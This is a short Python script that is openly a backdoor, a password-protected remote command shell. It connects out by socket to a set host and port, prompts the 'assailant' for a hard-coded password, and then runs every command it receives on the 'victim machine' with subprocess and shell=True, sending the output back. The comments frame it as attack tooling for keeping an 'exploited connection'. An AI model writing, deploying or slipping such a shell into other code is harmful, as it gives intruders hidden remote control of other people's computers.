#!/usr/bin/python3
"""



"""
# Import libraries:

# Importing subprocess to start a shell
import subprocess

# Import sockets for remote communication
import socket


host = '0.0.0.0'
port = 6666
password = 'testPASS1'


def __bformat__(target_str):
    """

    Takes a literal string and converts it to a byte-string which is returned.

    Args:
        target_str (str): The literal string that you would like converted.

    Returns:
        bytesliteral: The return value; which will be ready to pass directly over a socket.


    """


def Login():
    """

    In an effort to keep your exploited connection from becoming free-for-all for the entire internet it's wise to
    password-protect your access to the victim shell. That's where this function comes in, because moving on with the
    rest of the script won't be possible without the predefined password. Incorrect attempts just lead to the function
    looping/calling itself infinitely.

    Returns:
        None

    """
    global s
    
    # Send the connecting client a vague login prompt
    s.send('Login: ')
    
    # Expect 1024 bytes
    pwd = s.recv(1024)

    # If the provided input does not match the specified password we just call this same function again 
    if pwd.strip() != password:
        Login()
    else:
        
        # If the user got the password correct, we send an eager prompt to the assailant over socket
        s.send('Connected #> ')
        
        # Start the `Shell` function
        Shell()


# Execute shell commands
def Shell():
    """

    A function that will execute the requested shell-command, pass it to the victim machine as if we're ssh'd/vnc'd in

    Returns:
        None

    """
    
    # Loop until interrupted
    while True:
        
        # Receive 1024 bytes of data at a time from socket
        data = s.recv(1024)

        # If that data is a message with the `!die` command, we do just that - by breaking out of the loop
        if data.strip() == '!die':
            break

        # Spawn a subprocess that executes whatever command received over the socket
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        
        # Fill `output` with our processes output to be sent over the socket to the connected client
        output = proc.stdout.read() + proc.stderr.read()
        
        # Send the processes output back over the socket to the client
        s.send(output)
        
        # Send an eager prompt to the assailant
        s.send('#> ')


# Start program
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
Login()
